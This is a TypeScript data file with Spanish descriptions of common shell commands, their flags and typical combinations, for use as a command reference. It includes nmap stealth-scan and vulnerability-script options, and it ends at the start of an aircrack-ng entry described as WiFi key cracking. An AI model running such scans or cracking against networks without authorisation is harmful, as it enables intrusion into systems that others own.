// Base de conocimiento de comandos y sus argumentos
export interface ArgInfo {
    flag: string;
    name: string;
    description: string;
    example?: string;
    requiresValue?: boolean;
    valueHint?: string;
}

export interface CommandKnowledge {
    command: string;
    description: string;
    synopsis: string;
    args: ArgInfo[];
    commonCombinations?: string[];
}

// Base de datos de conocimiento de comandos
export const COMMAND_KNOWLEDGE: Record<string, CommandKnowledge> = {
    ls: {
        command: 'ls',
        description: 'Listar contenidos de directorios',
        synopsis: 'ls [OPCIONES] [ARCHIVO...]',
        args: [
            { flag: '-l', name: 'Formato largo', description: 'Muestra permisos, propietario, tamaño y fecha de modificación en columnas detalladas' },
            { flag: '-a', name: 'Mostrar ocultos', description: 'Incluye archivos que comienzan con punto (.) que normalmente están ocultos' },
            { flag: '-h', name: 'Tamaños legibles', description: 'Muestra tamaños en formato humano (K, M, G) en lugar de bytes' },
            { flag: '-R', name: 'Recursivo', description: 'Lista subdirectorios de forma recursiva, mostrando todo el árbol' },
            { flag: '-t', name: 'Ordenar por tiempo', description: 'Ordena por fecha de modificación, los más recientes primero' },
            { flag: '-S', name: 'Ordenar por tamaño', description: 'Ordena por tamaño de archivo, los más grandes primero' },
            { flag: '-r', name: 'Orden inverso', description: 'Invierte el orden de la lista (funciona con -t y -S)' },
            { flag: '-1', name: 'Una por línea', description: 'Muestra un archivo por línea, útil para scripts' },
            { flag: '--color', name: 'Colorear', description: 'Colorea la salida según tipo: directorios azul, ejecutables verde, enlaces cyan' },
            { flag: '-d', name: 'Solo directorio', description: 'Lista el directorio en sí, no su contenido' },
            { flag: '-i', name: 'Mostrar inodo', description: 'Muestra el número de inodo de cada archivo' },
        ],
        commonCombinations: ['ls -la', 'ls -lh', 'ls -ltr', 'ls -laR']
    },

    grep: {
        command: 'grep',
        description: 'Buscar patrones de texto en archivos usando expresiones regulares',
        synopsis: 'grep [OPCIONES] PATRÓN [ARCHIVO...]',
        args: [
            { flag: '-i', name: 'Ignorar mayúsculas', description: 'Realiza búsqueda sin distinguir entre mayúsculas y minúsculas' },
            { flag: '-r', name: 'Recursivo', description: 'Busca en todos los archivos bajo cada directorio, recursivamente' },
            { flag: '-n', name: 'Número de línea', description: 'Prefija cada línea de salida con el número de línea dentro del archivo' },
            { flag: '-v', name: 'Invertir', description: 'Invierte la búsqueda: muestra líneas que NO coinciden con el patrón' },
            { flag: '-c', name: 'Solo contar', description: 'Solo muestra el conteo de líneas coincidentes por archivo' },
            { flag: '-l', name: 'Solo nombres', description: 'Solo muestra nombres de archivos que contienen coincidencias' },
            { flag: '-w', name: 'Palabra completa', description: 'Solo coincide con palabras completas, no subcadenas' },
            { flag: '-E', name: 'Regex extendido', description: 'Interpreta el patrón como expresión regular extendida (ERE)' },
            { flag: '-A', name: 'Líneas después', description: 'Muestra N líneas de contexto después de cada coincidencia', requiresValue: true, valueHint: 'N' },
            { flag: '-B', name: 'Líneas antes', description: 'Muestra N líneas de contexto antes de cada coincidencia', requiresValue: true, valueHint: 'N' },
            { flag: '-C', name: 'Contexto', description: 'Muestra N líneas de contexto antes y después de la coincidencia', requiresValue: true, valueHint: 'N' },
            { flag: '--include', name: 'Incluir archivos', description: 'Solo busca en archivos que coincidan con el patrón glob', requiresValue: true, valueHint: '"*.txt"' },
            { flag: '--exclude', name: 'Excluir archivos', description: 'Omite archivos que coincidan con el patrón glob', requiresValue: true, valueHint: '"*.log"' },
            { flag: '--color', name: 'Colorear', description: 'Resalta las coincidencias en color para mejor visualización' },
            { flag: '-o', name: 'Solo coincidencia', description: 'Muestra solo la parte de la línea que coincide, no la línea completa' },
        ],
        commonCombinations: ['grep -rni "patrón" .', 'grep -v "excluir"', 'grep -E "regex|or"']
    },

    find: {
        command: 'find',
        description: 'Buscar archivos en una jerarquía de directorios',
        synopsis: 'find [RUTA] [EXPRESIÓN]',
        args: [
            { flag: '-name', name: 'Por nombre', description: 'Busca archivos cuyo nombre coincida con el patrón (sensible a mayúsculas)', requiresValue: true, valueHint: '"*.txt"' },
            { flag: '-iname', name: 'Nombre insensible', description: 'Como -name pero ignora mayúsculas/minúsculas', requiresValue: true, valueHint: '"*.TXT"' },
            { flag: '-type', name: 'Por tipo', description: 'Filtra por tipo: f=archivo regular, d=directorio, l=enlace simbólico', requiresValue: true, valueHint: 'f' },
            { flag: '-size', name: 'Por tamaño', description: 'Busca por tamaño: +100M (mayor a 100MB), -1k (menor a 1KB), 50M (exacto)', requiresValue: true, valueHint: '+100M' },
            { flag: '-mtime', name: 'Modificado días', description: 'Archivos modificados hace N días: +7 (hace más de 7), -7 (menos de 7)', requiresValue: true, valueHint: '-7' },
            { flag: '-mmin', name: 'Modificado minutos', description: 'Archivos modificados hace N minutos', requiresValue: true, valueHint: '-60' },
            { flag: '-user', name: 'Por usuario', description: 'Archivos pertenecientes al usuario especificado', requiresValue: true, valueHint: 'root' },
            { flag: '-group', name: 'Por grupo', description: 'Archivos pertenecientes al grupo especificado', requiresValue: true, valueHint: 'www-data' },
            { flag: '-perm', name: 'Por permisos', description: 'Busca archivos con permisos específicos (ej: 755, -644)', requiresValue: true, valueHint: '755' },
            { flag: '-exec', name: 'Ejecutar comando', description: 'Ejecuta un comando en cada archivo encontrado. {} representa el archivo', requiresValue: true, valueHint: 'rm {} \\;' },
            { flag: '-delete', name: 'Eliminar', description: '⚠️ PELIGRO: Elimina los archivos encontrados. Usar con precaución' },
            { flag: '-maxdepth', name: 'Profundidad máx', description: 'Limita la profundidad de búsqueda a N niveles de subdirectorios', requiresValue: true, valueHint: '2' },
            { flag: '-mindepth', name: 'Profundidad mín', description: 'No procesa directorios a menos de N niveles de profundidad', requiresValue: true, valueHint: '1' },
            { flag: '-empty', name: 'Vacíos', description: 'Encuentra archivos o directorios vacíos (0 bytes o sin contenido)' },
            { flag: '-newer', name: 'Más nuevo que', description: 'Archivos modificados más recientemente que el archivo de referencia', requiresValue: true, valueHint: 'archivo_ref' },
        ],
        commonCombinations: ['find . -name "*.log" -mtime +30 -delete', 'find / -type f -size +100M', 'find . -type f -exec grep "texto" {} \\;']
    },

    nmap: {
        command: 'nmap',
        description: 'Herramienta de exploración de red y escáner de seguridad',
        synopsis: 'nmap [Tipo de escaneo] [Opciones] {objetivo}',
        args: [
            { flag: '-sS', name: 'Escaneo SYN', description: 'Escaneo TCP SYN (sigiloso). No completa la conexión TCP, más difícil de detectar' },
            { flag: '-sT', name: 'Escaneo TCP Connect', description: 'Escaneo TCP completo. Usa la llamada connect() del sistema. Más lento pero funciona sin privilegios' },
            { flag: '-sU', name: 'Escaneo UDP', description: 'Escanea puertos UDP. Más lento que TCP porque UDP no confirma recepción' },
            { flag: '-sV', name: 'Detección de versión', description: 'Interroga puertos abiertos para determinar servicio/versión que están ejecutando' },
            { flag: '-sC', name: 'Scripts por defecto', description: 'Ejecuta scripts NSE por defecto. Equivalente a --script=default' },
            { flag: '-O', name: 'Detectar SO', description: 'Activa la detección del sistema operativo mediante fingerprinting TCP/IP' },
            { flag: '-A', name: 'Escaneo agresivo', description: 'Activa detección de SO, versiones, scripts y traceroute. Muy completo pero ruidoso' },
            { flag: '-p', name: 'Puertos', description: 'Especifica qué puertos escanear: -p22,80,443 o -p1-1000 o -p-', requiresValue: true, valueHint: '22,80,443' },
            { flag: '-p-', name: 'Todos los puertos', description: 'Escanea los 65535 puertos TCP. Muy completo pero lento' },
            { flag: '--top-ports', name: 'Top puertos', description: 'Escanea los N puertos más comúnmente usados según estadísticas', requiresValue: true, valueHint: '1000' },
            { flag: '-Pn', name: 'Sin ping', description: 'Trata todos los hosts como activos, omite la fase de descubrimiento de hosts' },
            { flag: '-T', name: 'Velocidad', description: 'Template de timing: T0(paranoico) a T5(insano). T4 es bueno para redes rápidas', requiresValue: true, valueHint: '4' },
            { flag: '-oN', name: 'Salida normal', description: 'Guarda el resultado en formato normal legible a un archivo', requiresValue: true, valueHint: 'scan.txt' },
            { flag: '-oX', name: 'Salida XML', description: 'Guarda el resultado en formato XML para procesamiento automatizado', requiresValue: true, valueHint: 'scan.xml' },
            { flag: '-oG', name: 'Salida grepeable', description: 'Guarda en formato fácil de procesar con grep', requiresValue: true, valueHint: 'scan.gnmap' },
            { flag: '-v', name: 'Verbose', description: 'Aumenta el nivel de detalle de la salida. Usa -vv para más detalle' },
            { flag: '--script', name: 'Scripts NSE', description: 'Ejecuta scripts específicos del motor NSE', requiresValue: true, valueHint: 'vuln,safe' },
            { flag: '-sn', name: 'Ping scan', description: 'Solo descubrimiento de hosts, no escanea puertos' },
        ],
        commonCombinations: ['nmap -sV -sC -O target', 'nmap -sS -p- -T4 target', 'nmap -Pn -sV --script vuln target']
    },

    curl: {
        command: 'curl',
        description: 'Transferir datos desde o hacia un servidor usando protocolos de red',
        synopsis: 'curl [opciones] [URL]',
        args: [
            { flag: '-X', name: 'Método HTTP', description: 'Especifica el método de petición HTTP a usar', requiresValue: true, valueHint: 'POST' },
            { flag: '-H', name: 'Cabecera', description: 'Añade una cabecera HTTP personalizada a la petición', requiresValue: true, valueHint: '"Content-Type: application/json"' },
            { flag: '-d', name: 'Datos', description: 'Envía datos en el cuerpo de la petición (implica POST)', requiresValue: true, valueHint: '\'{"key":"value"}\'' },
            { flag: '-o', name: 'Guardar como', description: 'Escribe la salida a un archivo en lugar de stdout', requiresValue: true, valueHint: 'archivo.html' },
            { flag: '-O', name: 'Guardar original', description: 'Guarda el archivo con su nombre original del servidor' },
            { flag: '-I', name: 'Solo cabeceras', description: 'Obtiene solo las cabeceras HTTP (petición HEAD)' },
            { flag: '-L', name: 'Seguir redirecciones', description: 'Sigue automáticamente las redirecciones HTTP (códigos 3xx)' },
            { flag: '-k', name: 'Inseguro', description: 'Permite conexiones SSL "inseguras", ignora errores de certificado' },
            { flag: '-u', name: 'Usuario', description: 'Especifica usuario y contraseña para autenticación del servidor', requiresValue: true, valueHint: 'usuario:contraseña' },
            { flag: '-v', name: 'Verbose', description: 'Muestra información detallada de la conexión y protocolo' },
            { flag: '-s', name: 'Silencioso', description: 'Modo silencioso, no muestra progreso ni errores' },
            { flag: '--cookie', name: 'Enviar cookie', description: 'Envía una cookie con la petición', requiresValue: true, valueHint: '"session=abc123"' },
            { flag: '-b', name: 'Archivo cookies', description: 'Lee cookies desde un archivo', requiresValue: true, valueHint: 'cookies.txt' },
            { flag: '-c', name: 'Guardar cookies', description: 'Guarda las cookies recibidas en un archivo', requiresValue: true, valueHint: 'cookies.txt' },
            { flag: '-A', name: 'User-Agent', description: 'Establece la cabecera User-Agent', requiresValue: true, valueHint: '"Mozilla/5.0..."' },
            { flag: '--proxy', name: 'Proxy', description: 'Usa el proxy especificado para la conexión', requiresValue: true, valueHint: 'http://proxy:8080' },
            { flag: '-F', name: 'Form data', description: 'Envía datos como multipart/form-data (para subir archivos)', requiresValue: true, valueHint: 'file=@archivo.txt' },
        ],
        commonCombinations: ['curl -X POST -H "Content-Type: application/json" -d \'{"data":1}\' URL', 'curl -sL URL | grep texto']
    },

    ssh: {
        command: 'ssh',
        description: 'Cliente OpenSSH para conexión remota segura',
        synopsis: 'ssh [opciones] [usuario@]host [comando]',
        args: [
            { flag: '-p', name: 'Puerto', description: 'Puerto del servidor SSH al que conectarse (por defecto 22)', requiresValue: true, valueHint: '2222' },
            { flag: '-i', name: 'Clave privada', description: 'Archivo de identidad (clave privada) para autenticación', requiresValue: true, valueHint: '~/.ssh/id_rsa' },
            { flag: '-L', name: 'Túnel local', description: 'Reenvía puerto local a través del servidor SSH: puerto_local:host:puerto_remoto', requiresValue: true, valueHint: '8080:localhost:80' },
            { flag: '-R', name: 'Túnel remoto', description: 'Reenvía puerto remoto hacia la máquina local', requiresValue: true, valueHint: '9090:localhost:3000' },
            { flag: '-D', name: 'Proxy SOCKS', description: 'Crea un proxy SOCKS dinámico en el puerto local especificado', requiresValue: true, valueHint: '1080' },
            { flag: '-N', name: 'Sin comando', description: 'No ejecuta ningún comando remoto, útil solo para túneles' },
            { flag: '-f', name: 'Background', description: 'Va a segundo plano justo antes de ejecutar el comando' },
            { flag: '-v', name: 'Verbose', description: 'Modo verbose para depuración. Usa -vv o -vvv para más detalle' },
            { flag: '-X', name: 'X11 Forwarding', description: 'Habilita el reenvío de X11 para aplicaciones gráficas' },
            { flag: '-C', name: 'Compresión', description: 'Habilita compresión de datos, útil en conexiones lentas' },
            { flag: '-o', name: 'Opción', description: 'Establece una opción de configuración SSH', requiresValue: true, valueHint: 'StrictHostKeyChecking=no' },
            { flag: '-J', name: 'Jump host', description: 'Conecta al destino a través de un host intermedio (ProxyJump)', requiresValue: true, valueHint: 'user@jumphost' },
            { flag: '-t', name: 'Forzar TTY', description: 'Fuerza la asignación de pseudo-terminal, necesario para comandos interactivos' },
        ],
        commonCombinations: ['ssh -i ~/.ssh/key.pem user@host', 'ssh -L 8080:localhost:80 user@host', 'ssh -D 1080 -N user@host']
    },

    chmod: {
        command: 'chmod',
        description: 'Cambiar permisos de archivos y directorios',
        synopsis: 'chmod [OPCIONES] MODO ARCHIVO...',
        args: [
            { flag: '-R', name: 'Recursivo', description: 'Aplica cambios recursivamente a todos los archivos y subdirectorios' },
            { flag: '-v', name: 'Verbose', description: 'Muestra un mensaje por cada archivo procesado' },
            { flag: '-c', name: 'Solo cambios', description: 'Como verbose pero solo muestra archivos que realmente cambiaron' },
            { flag: '--reference', name: 'Referencia', description: 'Usa los permisos de otro archivo como referencia', requiresValue: true, valueHint: 'archivo_modelo' },
            { flag: '+x', name: 'Añadir ejecución', description: 'Añade permiso de ejecución para todos los usuarios' },
            { flag: '-x', name: 'Quitar ejecución', description: 'Quita permiso de ejecución para todos los usuarios' },
            { flag: '+r', name: 'Añadir lectura', description: 'Añade permiso de lectura para todos los usuarios' },
            { flag: '+w', name: 'Añadir escritura', description: 'Añade permiso de escritura para todos los usuarios' },
            { flag: 'u+x', name: 'Usuario +ejecución', description: 'Añade permiso de ejecución solo para el propietario' },
            { flag: 'g+w', name: 'Grupo +escritura', description: 'Añade permiso de escritura para el grupo' },
            { flag: 'o-r', name: 'Otros -lectura', description: 'Quita permiso de lectura para otros usuarios' },
        ],
        commonCombinations: ['chmod 755 script.sh', 'chmod -R 644 *.txt', 'chmod u+x,g-w archivo']
    },

    tar: {
        command: 'tar',
        description: 'Utilidad de archivado para empaquetar y comprimir archivos',
        synopsis: 'tar [OPCIONES] [ARCHIVO] [ARCHIVOS...]',
        args: [
            { flag: '-c', name: 'Crear', description: 'Crea un nuevo archivo tar' },
            { flag: '-x', name: 'Extraer', description: 'Extrae archivos de un archivo tar' },
            { flag: '-t', name: 'Listar', description: 'Lista el contenido del archivo tar sin extraer' },
            { flag: '-z', name: 'Gzip', description: 'Filtra el archivo a través de gzip (comprime/descomprime .gz)' },
            { flag: '-j', name: 'Bzip2', description: 'Filtra el archivo a través de bzip2 (comprime/descomprime .bz2)' },
            { flag: '-J', name: 'XZ', description: 'Filtra el archivo a través de xz (mejor compresión, más lento)' },
            { flag: '-v', name: 'Verbose', description: 'Lista los archivos procesados de forma detallada' },
            { flag: '-f', name: 'Archivo', description: 'Nombre del archivo tar a usar (requerido en la mayoría de casos)', requiresValue: true, valueHint: 'archivo.tar.gz' },
            { flag: '-C', name: 'Directorio', description: 'Cambia al directorio especificado antes de realizar la operación', requiresValue: true, valueHint: '/ruta/destino' },
            { flag: '--exclude', name: 'Excluir', description: 'Excluye archivos que coincidan con el patrón', requiresValue: true, valueHint: '"*.log"' },
            { flag: '-p', name: 'Preservar permisos', description: 'Preserva los permisos originales al extraer' },
            { flag: '--strip-components', name: 'Quitar niveles', description: 'Quita N componentes de ruta al extraer', requiresValue: true, valueHint: '1' },
        ],
        commonCombinations: ['tar -czvf archivo.tar.gz carpeta/', 'tar -xzvf archivo.tar.gz', 'tar -tzvf archivo.tar.gz']
    },

    docker: {
        command: 'docker',
        description: 'Plataforma para desarrollar, desplegar y ejecutar aplicaciones en contenedores',
        synopsis: 'docker [OPCIONES] COMANDO',
        args: [
            { flag: 'run', name: 'Ejecutar', description: 'Crea y ejecuta un nuevo contenedor desde una imagen' },
            { flag: 'ps', name: 'Listar', description: 'Lista los contenedores en ejecución' },
            { flag: 'ps -a', name: 'Listar todos', description: 'Lista todos los contenedores, incluyendo los detenidos' },
            { flag: 'images', name: 'Imágenes', description: 'Lista las imágenes disponibles localmente' },
            { flag: 'pull', name: 'Descargar', description: 'Descarga una imagen desde un registro (Docker Hub por defecto)' },
            { flag: 'build', name: 'Construir', description: 'Construye una imagen desde un Dockerfile' },
            { flag: 'exec', name: 'Ejecutar en', description: 'Ejecuta un comando dentro de un contenedor en ejecución' },
            { flag: 'stop', name: 'Detener', description: 'Detiene uno o más contenedores en ejecución' },
            { flag: 'rm', name: 'Eliminar', description: 'Elimina uno o más contenedores' },
            { flag: 'rmi', name: 'Eliminar imagen', description: 'Elimina una o más imágenes' },
            { flag: 'logs', name: 'Ver logs', description: 'Muestra los logs de un contenedor' },
            { flag: '-it', name: 'Interactivo', description: 'Modo interactivo con terminal asignado (para run/exec)' },
            { flag: '-d', name: 'Detached', description: 'Ejecuta el contenedor en segundo plano' },
            { flag: '-p', name: 'Puerto', description: 'Mapea un puerto del host al contenedor', requiresValue: true, valueHint: '8080:80' },
            { flag: '-v', name: 'Volumen', description: 'Monta un directorio del host en el contenedor', requiresValue: true, valueHint: '/host:/container' },
            { flag: '-e', name: 'Variable env', description: 'Establece una variable de entorno', requiresValue: true, valueHint: 'KEY=value' },
            { flag: '--name', name: 'Nombre', description: 'Asigna un nombre al contenedor', requiresValue: true, valueHint: 'mi_contenedor' },
            { flag: '--rm', name: 'Auto-eliminar', description: 'Elimina automáticamente el contenedor cuando se detiene' },
            { flag: '--network', name: 'Red', description: 'Conecta el contenedor a una red específica', requiresValue: true, valueHint: 'mi_red' },
        ],
        commonCombinations: ['docker run -it --rm ubuntu bash', 'docker exec -it container bash', 'docker build -t myapp .']
    },

    git: {
        command: 'git',
        description: 'Sistema de control de versiones distribuido',
        synopsis: 'git [--version] [--help] COMANDO [ARGS]',
        args: [
            { flag: 'init', name: 'Inicializar', description: 'Crea un nuevo repositorio Git vacío' },
            { flag: 'clone', name: 'Clonar', description: 'Clona un repositorio en un nuevo directorio' },
            { flag: 'status', name: 'Estado', description: 'Muestra el estado del árbol de trabajo' },
            { flag: 'add', name: 'Añadir', description: 'Añade cambios al área de preparación (staging)' },
            { flag: 'commit', name: 'Confirmar', description: 'Registra los cambios en el repositorio' },
            { flag: 'push', name: 'Subir', description: 'Actualiza las referencias remotas junto con los objetos asociados' },
            { flag: 'pull', name: 'Descargar', description: 'Obtiene y fusiona cambios desde un repositorio remoto' },
            { flag: 'fetch', name: 'Obtener', description: 'Descarga objetos y referencias de otro repositorio' },
            { flag: 'branch', name: 'Rama', description: 'Lista, crea o elimina ramas' },
            { flag: 'checkout', name: 'Cambiar', description: 'Cambia de rama o restaura archivos del árbol de trabajo' },
            { flag: 'merge', name: 'Fusionar', description: 'Une dos o más historiales de desarrollo' },
            { flag: 'log', name: 'Historial', description: 'Muestra los logs de commits' },
            { flag: 'diff', name: 'Diferencias', description: 'Muestra cambios entre commits, commit y árbol de trabajo, etc.' },
            { flag: 'stash', name: 'Guardar temporal', description: 'Guarda temporalmente los cambios del directorio de trabajo' },
            { flag: 'reset', name: 'Resetear', description: 'Restablece el HEAD actual al estado especificado' },
            { flag: '-m', name: 'Mensaje', description: 'Mensaje del commit', requiresValue: true, valueHint: '"Descripción del cambio"' },
            { flag: '-b', name: 'Nueva rama', description: 'Crea y cambia a una nueva rama', requiresValue: true, valueHint: 'nombre-rama' },
            { flag: '-f', name: 'Forzar', description: 'Fuerza la operación (usado con push, checkout, etc.)' },
            { flag: '--hard', name: 'Reset duro', description: 'Resetea el índice y el árbol de trabajo (descarta cambios locales)' },
            { flag: '--soft', name: 'Reset suave', description: 'Solo resetea HEAD, mantiene cambios en staging' },
        ],
        commonCombinations: ['git add . && git commit -m "msg"', 'git checkout -b feature/nueva', 'git reset --hard HEAD~1']
    },

    ps: {
        command: 'ps',
        description: 'Reportar una instantánea de los procesos actuales',
        synopsis: 'ps [OPCIONES]',
        args: [
            { flag: 'aux', name: 'Todos detallado', description: 'Muestra todos los procesos de todos los usuarios con información completa' },
            { flag: '-e', name: 'Todos', description: 'Selecciona todos los procesos' },
            { flag: '-f', name: 'Formato completo', description: 'Listado en formato completo con más columnas' },
            { flag: '-u', name: 'Por usuario', description: 'Filtra procesos por usuario específico', requiresValue: true, valueHint: 'root' },
            { flag: '-p', name: 'Por PID', description: 'Selecciona proceso por ID de proceso', requiresValue: true, valueHint: '1234' },
            { flag: '--sort', name: 'Ordenar', description: 'Ordena la salida por la columna especificada', requiresValue: true, valueHint: '-%mem' },
            { flag: '-o', name: 'Formato custom', description: 'Especifica columnas personalizadas a mostrar', requiresValue: true, valueHint: 'pid,user,%cpu,cmd' },
            { flag: '--forest', name: 'Árbol', description: 'Muestra la jerarquía de procesos en formato de árbol' },
        ],
        commonCombinations: ['ps aux | grep nginx', 'ps aux --sort=-%mem | head', 'ps -ef --forest']
    },

    kill: {
        command: 'kill',
        description: 'Enviar señales a procesos',
        synopsis: 'kill [OPCIONES] PID...',
        args: [
            { flag: '-9', name: 'SIGKILL', description: 'Termina el proceso inmediatamente. No puede ser ignorada. Último recurso' },
            { flag: '-15', name: 'SIGTERM', description: 'Solicita terminación graceful. Permite al proceso limpiar. Es el default' },
            { flag: '-1', name: 'SIGHUP', description: 'Hangup. Hace que muchos daemons recarguen su configuración' },
            { flag: '-2', name: 'SIGINT', description: 'Interrupción. Equivalente a Ctrl+C' },
            { flag: '-l', name: 'Listar señales', description: 'Lista todos los nombres de señales disponibles' },
            { flag: '-s', name: 'Señal por nombre', description: 'Especifica la señal por nombre', requiresValue: true, valueHint: 'SIGTERM' },
        ],
        commonCombinations: ['kill -9 1234', 'kill -HUP $(pgrep nginx)', 'kill -15 $(pidof proceso)']
    },

    cd: {
        command: 'cd',
        description: 'Cambiar el directorio de trabajo actual',
        synopsis: 'cd [DIRECTORIO]',
        args: [
            { flag: '-', name: 'Anterior', description: 'Vuelve al directorio anterior (equivale a cd $OLDPWD)' },
            { flag: '~', name: 'Home', description: 'Va al directorio home del usuario actual' },
            { flag: '..', name: 'Padre', description: 'Sube un nivel en la jerarquía de directorios' },
            { flag: '-P', name: 'Físico', description: 'Usa la estructura física sin seguir enlaces simbólicos' },
            { flag: '-L', name: 'Lógico', description: 'Sigue los enlaces simbólicos (comportamiento por defecto)' },
        ],
        commonCombinations: ['cd ~', 'cd -', 'cd ..', 'cd /var/www']
    },

    cp: {
        command: 'cp',
        description: 'Copiar archivos y directorios',
        synopsis: 'cp [OPCIONES] ORIGEN DESTINO',
        args: [
            { flag: '-r', name: 'Recursivo', description: 'Copia directorios recursivamente incluyendo subdirectorios' },
            { flag: '-i', name: 'Interactivo', description: 'Pregunta antes de sobrescribir archivos existentes' },
            { flag: '-v', name: 'Verbose', description: 'Muestra los archivos mientras se copian' },
            { flag: '-p', name: 'Preservar', description: 'Preserva permisos, propietario y timestamps' },
            { flag: '-a', name: 'Archivo', description: 'Modo archivo: preserva todo (-dpR), ideal para backups' },
            { flag: '-u', name: 'Update', description: 'Solo copia si el origen es más reciente que el destino' },
            { flag: '-n', name: 'No sobrescribir', description: 'No sobrescribe archivos existentes' },
            { flag: '-l', name: 'Hard link', description: 'Crea hard links en lugar de copiar' },
            { flag: '-s', name: 'Symlink', description: 'Crea enlaces simbólicos en lugar de copiar' },
        ],
        commonCombinations: ['cp -r carpeta/ backup/', 'cp -av origen/ destino/', 'cp -i archivo.txt copia.txt']
    },

    mv: {
        command: 'mv',
        description: 'Mover o renombrar archivos y directorios',
        synopsis: 'mv [OPCIONES] ORIGEN DESTINO',
        args: [
            { flag: '-i', name: 'Interactivo', description: 'Pregunta antes de sobrescribir' },
            { flag: '-v', name: 'Verbose', description: 'Explica qué se está haciendo' },
            { flag: '-n', name: 'No sobrescribir', description: 'No sobrescribe archivos existentes' },
            { flag: '-u', name: 'Update', description: 'Solo mueve si el origen es más nuevo' },
            { flag: '-f', name: 'Forzar', description: 'No pregunta antes de sobrescribir' },
            { flag: '-b', name: 'Backup', description: 'Crea backup de archivos que serían sobrescritos' },
        ],
        commonCombinations: ['mv archivo.txt nuevo.txt', 'mv -i *.log /backup/', 'mv -v carpeta/ /nueva/ubicacion/']
    },

    rm: {
        command: 'rm',
        description: 'Eliminar archivos o directorios',
        synopsis: 'rm [OPCIONES] ARCHIVO...',
        args: [
            { flag: '-r', name: 'Recursivo', description: 'Elimina directorios y su contenido recursivamente' },
            { flag: '-f', name: 'Forzar', description: 'Ignora archivos inexistentes, nunca pregunta' },
            { flag: '-i', name: 'Interactivo', description: 'Pregunta antes de cada eliminación' },
            { flag: '-v', name: 'Verbose', description: 'Explica qué se está eliminando' },
            { flag: '-d', name: 'Directorio', description: 'Elimina directorios vacíos' },
            { flag: '--preserve-root', name: 'Proteger root', description: 'No elimina / (activado por defecto)' },
        ],
        commonCombinations: ['rm -rf carpeta/', 'rm -i archivo.txt', 'rm -v *.log']
    },

    mkdir: {
        command: 'mkdir',
        description: 'Crear directorios',
        synopsis: 'mkdir [OPCIONES] DIRECTORIO...',
        args: [
            { flag: '-p', name: 'Parents', description: 'Crea directorios padre si no existen, sin error si ya existe' },
            { flag: '-v', name: 'Verbose', description: 'Muestra mensaje por cada directorio creado' },
            { flag: '-m', name: 'Mode', description: 'Establece permisos del directorio', requiresValue: true, valueHint: '755' },
        ],
        commonCombinations: ['mkdir -p a/b/c', 'mkdir -m 700 privado', 'mkdir -pv proyecto/{src,test,docs}']
    },

    touch: {
        command: 'touch',
        description: 'Cambiar timestamps de archivos o crear archivos vacíos',
        synopsis: 'touch [OPCIONES] ARCHIVO...',
        args: [
            { flag: '-a', name: 'Access time', description: 'Solo cambia el tiempo de acceso' },
            { flag: '-m', name: 'Modify time', description: 'Solo cambia el tiempo de modificación' },
            { flag: '-c', name: 'No crear', description: 'No crea archivos que no existan' },
            { flag: '-t', name: 'Timestamp', description: 'Usa el timestamp especificado', requiresValue: true, valueHint: '202301011200' },
            { flag: '-r', name: 'Referencia', description: 'Usa el timestamp de otro archivo', requiresValue: true, valueHint: 'archivo_ref' },
        ],
        commonCombinations: ['touch archivo.txt', 'touch -c existente.txt', 'touch -t 202312251200 navidad.txt']
    },

    cat: {
        command: 'cat',
        description: 'Concatenar archivos y mostrar en salida estándar',
        synopsis: 'cat [OPCIONES] [ARCHIVO...]',
        args: [
            { flag: '-n', name: 'Numerar', description: 'Numera todas las líneas de salida' },
            { flag: '-b', name: 'Numerar no vacías', description: 'Numera solo líneas no vacías' },
            { flag: '-s', name: 'Squeeze', description: 'Suprime líneas vacías repetidas' },
            { flag: '-E', name: 'Mostrar fin', description: 'Muestra $ al final de cada línea' },
            { flag: '-T', name: 'Mostrar tabs', description: 'Muestra tabuladores como ^I' },
            { flag: '-A', name: 'Mostrar todo', description: 'Equivale a -vET, muestra caracteres no imprimibles' },
        ],
        commonCombinations: ['cat archivo.txt', 'cat -n script.sh', 'cat file1 file2 > combined.txt']
    },

    head: {
        command: 'head',
        description: 'Mostrar las primeras líneas de un archivo',
        synopsis: 'head [OPCIONES] [ARCHIVO...]',
        args: [
            { flag: '-n', name: 'Líneas', description: 'Muestra las primeras N líneas', requiresValue: true, valueHint: '10' },
            { flag: '-c', name: 'Bytes', description: 'Muestra los primeros N bytes', requiresValue: true, valueHint: '100' },
            { flag: '-q', name: 'Quiet', description: 'No muestra cabeceras con nombres de archivo' },
            { flag: '-v', name: 'Verbose', description: 'Siempre muestra cabeceras con nombres de archivo' },
        ],
        commonCombinations: ['head -n 20 archivo.txt', 'head -c 1K archivo.bin', 'head -n 5 *.log']
    },

    tail: {
        command: 'tail',
        description: 'Mostrar las últimas líneas de un archivo',
        synopsis: 'tail [OPCIONES] [ARCHIVO...]',
        args: [
            { flag: '-n', name: 'Líneas', description: 'Muestra las últimas N líneas', requiresValue: true, valueHint: '10' },
            { flag: '-f', name: 'Follow', description: 'Sigue el archivo en tiempo real, mostrando nuevas líneas' },
            { flag: '-F', name: 'Follow nombre', description: 'Como -f pero sigue el nombre si el archivo rota' },
            { flag: '-c', name: 'Bytes', description: 'Muestra los últimos N bytes', requiresValue: true, valueHint: '100' },
            { flag: '--pid', name: 'PID', description: 'Termina cuando el proceso con ese PID muere', requiresValue: true, valueHint: '1234' },
            { flag: '-s', name: 'Sleep', description: 'Segundos entre iteraciones con -f', requiresValue: true, valueHint: '1' },
        ],
        commonCombinations: ['tail -f /var/log/syslog', 'tail -n 100 access.log', 'tail -F app.log']
    },

    less: {
        command: 'less',
        description: 'Visor de archivos interactivo con navegación avanzada',
        synopsis: 'less [OPCIONES] [ARCHIVO...]',
        args: [
            { flag: '-N', name: 'Números línea', description: 'Muestra números de línea' },
            { flag: '-S', name: 'Chop lines', description: 'No envuelve líneas largas, permite scroll horizontal' },
            { flag: '-i', name: 'Ignorar mayús', description: 'Búsquedas ignoran mayúsculas/minúsculas' },
            { flag: '-F', name: 'Quit if one', description: 'Sale si el contenido cabe en una pantalla' },
            { flag: '-R', name: 'Raw control', description: 'Muestra códigos de color ANSI' },
            { flag: '-X', name: 'No clear', description: 'No limpia la pantalla al salir' },
            { flag: '+F', name: 'Follow', description: 'Inicia en modo follow como tail -f' },
            { flag: '-g', name: 'Highlight', description: 'Solo resalta la última búsqueda, no todas' },
        ],
        commonCombinations: ['less -N archivo.txt', 'less +F /var/log/syslog', 'less -RS archivo_ancho.csv']
    },


    'aircrack-ng': {
        command: 'aircrack-ng',
        description: 'Suite de auditoría de redes WiFi - crackeo de claves WEP/WPA',
        synopsis: 'aircrack-ng [opciones] <archivo.cap>',
        args: [
